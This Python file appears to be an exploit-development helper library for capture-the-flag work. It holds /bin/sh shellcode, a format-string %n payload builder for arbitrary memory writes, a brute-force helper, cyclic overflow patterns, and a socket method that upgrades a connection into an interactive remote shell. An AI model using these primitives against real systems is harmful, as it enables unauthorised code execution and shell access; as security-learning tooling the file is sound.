import hashlib
import itertools
import math
import os
import random
import re
import select
import shlex
import socket as sock
import string
import struct
import subprocess
import sys
import telnetlib
import time

try:
    import termios
    import tty
except ImportError:
    pass


DEFAULT_PORT = 1337

SHELLCODE = b"\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05"
SHELLCODE_LONG = b"\x48\x31\xd2\x48\xbb\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x48\xc1\xeb\x08\x53\x48\x89\xe7\x50\x57\x48\x89\xe6\xb0\x3b\x0f\x05"

CLEAR_LINE = "\033[K"

COLORS = {
    "black": "\033[30m",
    "red": "\033[31m",
    "green": "\033[32m",
    "yellow": "\033[33m",
    "blue": "\033[34m",
    "purple": "\033[35m",
    "cyan": "\033[36m",
    "lightgray": "\033[37m",
    "darkgray": "\033[90m",
    "lightred": "\033[91m",
    "lightgreen": "\033[92m",
    "lightyellow": "\033[93m",
    "orange": "\033[93m",
    "lightblue": "\033[94m",
    "lightpurble": "\033[95m",
    "pink": "\033[95m",
    "lightcyan": "\033[96m",
    "white": "\033[97m",
    "endc": "\033[0m",
    "bold": "\033[1m",
    "underline": "\033[4m",
}


# General utility


def write_stdout(b, flush=True):
    if isinstance(b, bytes):
        sys.stdout.buffer.write(b)
    else:
        sys.stdout.write(str(b))

    if flush:
        sys.stdout.flush()


def flush_stdout():
    sys.stdout.flush()


def write_stderr(b, flush=True):
    if isinstance(b, bytes):
        sys.stderr.buffer.write(b)
    else:
        sys.stderr.write(str(b))

    if flush:
        sys.stderr.flush()


def remove_colors(s):
    return re.sub(r"\x1b\[(\d;)?3?\dm", "", s)


def sha256(s):
    if isinstance(s, bytes):
        return hashlib.sha256(s).hexdigest()
    return hashlib.sha256(str(s).encode()).hexdigest()


def brute_force(predicate, min_length=1, max_length=5, alphabet=string.ascii_letters):
    for password_length in range(min_length, max_length + 1):
        for guess in itertools.product(alphabet, repeat=password_length):
            guess = "".join(guess)
            if predicate(guess):
                return guess
    return None


def paddr(s, length, pattern=None):
    """
    Extend a string to <length> by adding <pattern> on the right.
    """
    if pattern is None:
        pattern = b"A" if isinstance(s, bytes) else "A"
    missing_length = length - len(s)
    return (
        s
        + missing_length // len(pattern) * pattern
        + pattern[: missing_length % len(pattern)]
    )


def paddl(s, length, pattern=None):
    """
    Extend a string to <length> by adding <pattern> on the left.
    """
    if pattern is None:
        pattern = b"A" if isinstance(s, bytes) else "A"
    missing_length = length - len(s)
    return (
        missing_length // len(pattern) * pattern
        + pattern[: missing_length % len(pattern)]
        + s
    )


def run(cmd, stdin=None):
    if isinstance(cmd, str):
        cmd = shlex.split(cmd)

    proc = subprocess.Popen(
        cmd, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE
    )

    if isinstance(stdin, str):
        stdin = stdin.encode("utf8")

    stdout, stderr = proc.communicate(stdin)
    exitcode = proc.wait()

    if exitcode != 0 or stderr:
        msg = f"Failed to run {cmd}"
        if exitcode != 0:
            msg += f" with exitcode {exitcode}"
        if stderr:
            msg += f".\nSTDERR:\n{stderr}"
        raise Exception(msg)

    return stdout


def is_local():
    return "-" in sys.argv[1:]


def rnd_string(count=1, alphabet=string.ascii_letters):
    return "".join(random.choice(alphabet) for _ in range(count))


# Console output


def log(
    *args, end="\n", sep=" ", color="white", highlight="blue", symbol="green"
):
    args_formatted = []
    for x in args:
        if isinstance(x, int):
            args_formatted.append(COLORS["blue"] + hex(x) + COLORS["endc"])
        else:
            args_formatted.append(str(x))
    txt = f"[{COLORS[symbol]}*{COLORS['endc']}] {COLORS[color]}"
    txt += re.sub(r"\*\*(.*?)\*\*", f"{COLORS[highlight]}\\1{COLORS[color]}", sep.join(args_formatted))
    txt += COLORS["endc"]
    print(txt, end=end)


def info(*args, **kwargs):
    log(*args, color="darkgray", highlight="cyan", symbol="cyan", **kwargs)


def error(*args, **kwargs):
    log(*args, color="red", symbol="red", **kwargs)


def colorize(s):
    return s.format(**COLORS)


# Bytes stuff


def pack(fmt, s):
    if isinstance(s, int):
        return struct.pack(fmt, s)
    if isinstance(s, list):
        return b"".join(pack(fmt, x) for x in s)
    if isinstance(s, bytes):
        try:
            struct.unpack(fmt, s)
            return s
        except struct.error:
            raise Exception(f"Cannot pack {s} as '{fmt}'")
    raise Exception("Unpackable type:", type(s))


def p8(s):
    return pack("<Q", s)


def u8(b):
    return struct.unpack("<Q", paddr(b[:8], 8, b"\x00"))[0]


def diff(start, target, bytes=2):
    """
    Calculate how much you have to add to <start> to get
    to <target> if the number overflows after <bytes> bytes.

    This is mainly useful for calculating how many more
    characters to print when using printf with %n
    """
    bytes_max = 1 << (8 * bytes)
    start %= bytes_max
    if target >= start:
        return target - start
    return bytes_max - start + target


def de_bruijn(n=4, alphabet=string.ascii_letters):
    k = len(alphabet)
    a = [0] * k * n

    def db(t, p):
        if t > n:
            if n % p == 0:
                for j in range(1, p + 1):
                    yield alphabet[a[j]]
        else:
            a[t] = a[t - p]
            for c in db(t + 1, p):
                yield c

            for j in range(a[t - p] + 1, k):
                a[t] = j
                for c in db(t + 1, t):
                    yield c

    return db(1, 1)


def cyclic(length=None, n=4, alphabet=string.ascii_lowercase):
    if length is not None and len(alphabet) ** n < length:
        raise ValueError(f"Patter length to large: {length}")

    out = ""
    for i, c in enumerate(de_bruijn(n, alphabet)):
        if length != None and i >= length:
            break
        else:
            out += c
    return out


def cyclic_find(pattern, n=4, alphabet=string.ascii_lowercase):
    if len(pattern) < n:
        raise ValueError(f"Pattern length shorter than n ({n})")
    elif len(pattern) > n:
        pattern = pattern[:n]

    last_n = ""
    for i, c in enumerate(de_bruijn(n, alphabet)):
        last_n += c
        if len(last_n) > n:
            last_n = last_n[1:]
        if last_n == pattern:
            return i - n + 1
    return -1


# Format String Builder

LENGTH_MODIFIERS = {1: "hh", 2: "h", 4: "", 8: "l"}


class FormatString:
    def __init__(self, offset=0, written=0):
        self.written = written
        self.parts = []
        self.writes = []
        self.offset = offset
        self.no_cache = -1

    def _get_reg_offset(self, reg):
        registers = ["di", "si", "dx", "cx", "8", "9"]
        reg = reg.lower()[1:]
        for i, r in enumerate(registers):
            if r == reg:
                return i
        return None

    def _get_length_from_mods(self, mods):
        if mods[-1] == "p":
            return 16
        if mods[-1] == "x":
            return {"hh": 2, "h": 4, "": 8, "l": 16, "ll": 32}[mods[:-1]]
        raise Exception(f"Can not guess length for %{mods} modifiers")

    def _calc_addr_offset(self, written, fmt_length):
        for target, _, bytes in self.writes:
            to_write = diff(written, target, bytes)
            if to_write < 8:
                to_write += 1 << (8 * bytes)
            fmt_length += len(f"%{to_write}x")
            written += to_write
            fmt_length += len(f"%${LENGTH_MODIFIERS[bytes]}n")

        offset = math.ceil((fmt_length + self.offset) / 8) + 6
        prev_offset = 0
        while offset != prev_offset:
            prev_offset = offset
            total_length = fmt_length + sum(
                len(str(offset + x)) for x in range(len(self.writes))
            )
            offset = math.ceil((total_length + self.offset) / 8) + 6

        padding = 8 - (total_length + self.offset) % 8
        if padding == 8:
            offset += 1
        return offset, padding

    def print(self, s):
        self.parts.append(str(s))

    def print_positional(self, pos, mods="p", length=None):
        """
        print %<pos>$<length><mods>

        if length is not set the function will choose an appropriate value
        """
        if length is None:
            length = self._get_length_from_mods(mods)
        self.parts.append((True, pos, mods, length))

    def print_reg(self, register, mods="p"):
        """
        Print the content of <register>
        Valid registers are 'rdi', 'rsi', 'rdx', 'rcx', 'r8', 'r9'
        """
        reg_offset = self._get_reg_offset(register)
        if reg_offset is None:
            raise Exception("Invalid register:", register)
        return self.print_positional(reg_offset, mods)

    def print_stack(self, offset, mods="p"):
        """
        Print a value on the stack
        """
        self.print_positional(offset + 6, mods)

    def write_positional(self, arg, val, bytes=2, no_cache=False):
        """
        Write <val> to <arg> overriding <bytes> many bytes

        If <no_cache> is True this will not use positional args
        to avoid printf caching it's arguments
        """
        if bytes not in (1, 2, 4, 8):
            raise Exception("bytes must be one of (1, 2, 4, 8)")
        if no_cache:
            self.no_cache = len(self.parts)
        self.parts.append((False, arg - 1, val, bytes))

    def write_reg(self, register, val, bytes=2, no_cache=False):
        """
        Write <val> to the address in <register>
        Valid registers are 'rdi', 'rsi', 'rdx', 'rcx', 'r8', 'r9'
        """
        reg_offset = self._get_reg_offset(register)
        if reg_offset is None:
            raise Exception("Invalid register:", register)
        return self.write_positional(reg_offset, val, bytes, no_cache)

    def write_stack(self, offset, val, bytes=2, no_cache=False):
        """
        Write <val> to the address on the stack at <offset>
        """
        self.write_positional(offset + 6, val, bytes, no_cache)

    def write_address(self, address, val, bytes=2, bytes_at_once=2):
        """
        Write <val> to <address> overriding <bytes> many bytes
        and writing <bytes_at_once> bytes at a time
        """
        if bytes <= 2:
            return self.writes.append((val, address, bytes))

        bit_mask = (1 << (8 * bytes_at_once)) - 1
        for i in range(bytes // bytes_at_once):
            to_write = (val >> (i * bytes_at_once * 8)) & bit_mask
            self.writes.append((to_write, address + i * bytes_at_once, bytes_at_once))

        start = bytes - (bytes % bytes_at_once)
        for i in range(bytes % bytes_at_once):
            to_write = (val >> ((start + i) * 8)) & 0xFF
            self.writes.append((to_write, address + start + i, 1))

    def build(self, end=""):
        fmt = ""
        written = self.written
        curr_arg = 0

        for i, part in enumerate(self.parts):
            if isinstance(part, str):
                fmt += part
                written += len(part)
                continue

            read, arg, arg1, arg2 = part
            if self.no_cache >= i:
                if curr_arg > arg:
                    raise Exception(
                        f"no_cache is impossible to satisfy ({curr_arg} before {arg})"
                    )
                while curr_arg < arg:
                    fmt += "%8x"
                    written += 8
                    curr_arg += 1

            if read:
                mods, length = arg1, arg2
                zero = mods.startswith("0")
                if zero:
                    mods = mods[1:]
                written += length + 2
                fmt += "|"
                tmp = str(length) + mods + "|"
                if zero:
                    tmp = "0" + tmp
            else:
                s, bytes = arg1, arg2
                to_write = diff(written, s, bytes)
                if to_write < 8:
                    to_write += 1 << (8 * bytes)
                fmt += f"%{to_write}x"
                written += to_write
                curr_arg += 1
                arg += 1

                tmp = f"{LENGTH_MODIFIERS[bytes]}n"

            if self.no_cache >= i:
                fmt += "%" + tmp
                curr_arg += 1
            else:
                fmt += f"%{arg}${tmp}"

        if not self.writes:
            return (fmt + end).encode()

        addrs = []
        addr_args, addr_padding = self._calc_addr_offset(written, len(fmt) + len(end))
        for i, (s, addr, bytes) in enumerate(self.writes):
            addrs.append(addr)

            to_write = diff(written, s, bytes)
            if to_write < 8:
                to_write += 1 << (8 * bytes)
            fmt += f"%{to_write}x"
            written += to_write

            fmt += f"%{addr_args + i}${LENGTH_MODIFIERS[bytes]}n"

        fmt += end + "\0" * addr_padding

        return fmt.encode() + p8(addrs)


# Socket

portforwarding_active = False


def __get_port_forwarding_termination_func(process):
    def terminate():
        global portforwarding_active
        info("Terminating ssh port forwarding ...")
        try:
            process.terminate()
            info("=> Done.")
        except ProcessLookupError:
            info("=> Was already terminated.")
        portforwarding_active = False

    return terminate


def create_socket(host, port, print_message=True, local_port=DEFAULT_PORT, **kwargs):
    """
    Create a new socket that connects to <host>:<port>.
    If the command line option "-" was given it instead connects to localhost:<local_port>
    """
    if is_local():
        host = "localhost"
        port = local_port

    if print_message:
        info(f"Connecting socket to **{host}:{port}**")

    return socket(host, port, **kwargs)


class socket(sock.socket):
    """
    Extension of the socket.socket class with additional functionality.
    """

    def __init__(self, host, port, timeout=None, retries=10, retry_timeout=2):
        """
        Create a new socket and connect it to <host>:<port>
        """
        super().__init__()

        if timeout:
            self.settimeout(timeout)

        while True:
            try:
                self.connect((host, port))
                break
            except ConnectionRefusedError:
                if retries <= 0:
                    error("ERROR: Connection Refused. No retries left.")
                    raise

                error(
                    f"ERROR: Connection Refused. Trying again in {retry_timeout} seconds ({retries} retries left)"
                )
                retries -= 1
                time.sleep(retry_timeout)

    def recvs(self, buffer=256):
        """
        Recieve <buffer> bytes and return the result as string.
        """
        return self.recv(buffer).decode()

    def recv_until(self, delim, skip=None):
        if isinstance(delim, str):
            delim = delim.encode()
        if isinstance(skip, str):
            skip = skip.encode()

        result = b""
        while not result.endswith(delim):
            output = self.recv(1)
            if not output:
                break
            if output != skip:
                result += output
        return result

    def recv_all(self, max_len=None, skip=None):
        if isinstance(skip, str):
            skip = skip.encode()

        result = b""
        while max_len is None or len(result) < max_len:
            output = self.recv(1)
            if not output:
                break
            if output != skip:
                result += output
        return result

    def sendall(self, s):
        if isinstance(s, bytes):
            super().sendall(s)
        else:
            super().sendall(str(s).encode())

    def sendline(self, s):
        """
        Send a string or byte value with a linefeed.
        """
        if isinstance(s, bytes):
            self.sendall(s + b"\n")
        else:
            self.sendall(str(s).encode() + b"\n")

    def shell(self):
        log("Spawning shell:")

        time.sleep(0.2)
        code = 'import pty; pty.spawn(["/bin/bash", "-i"])'
        self.sendline(f"python -c '{code}'")
        time.sleep(0.2)

        old_settings = termios.tcgetattr(sys.stdin.fileno())

        try:
            tty.setraw(sys.stdin)
            cols, rows = os.get_terminal_size(sys.stdin.fileno())
            self.sendline(f"stty rows {rows} cols {cols}; echo READY")
            self.recv_until("READY")
            self.recv_until("READY")
            self.recv_until("\n")

            while True:
                available, *_ = select.select([sys.stdin, self], [], [])
                for src in available:
                    if src == sys.stdin:
                        data = sys.stdin.buffer.read1(1024)
                        self.sendall(data)

                        if b"\x03" in data or b"\x04" in data:
                            sys.stdout.buffer.write(b"\r\n")
                            sys.stdout.flush()
                            return
                    else:
                        data = self.recv(4096)
                        sys.stdout.buffer.write(data)
                        sys.stdout.flush()
        finally:
            termios.tcsetattr(sys.stdin.fileno(), termios.TCSADRAIN, old_settings)

    def interact(self):
        """
        Pass the socket to telnet to allow interactive access to it.
        """
        log("Telnet takeover:")
        t = telnetlib.Telnet()
        t.sock = self
        t.interact()
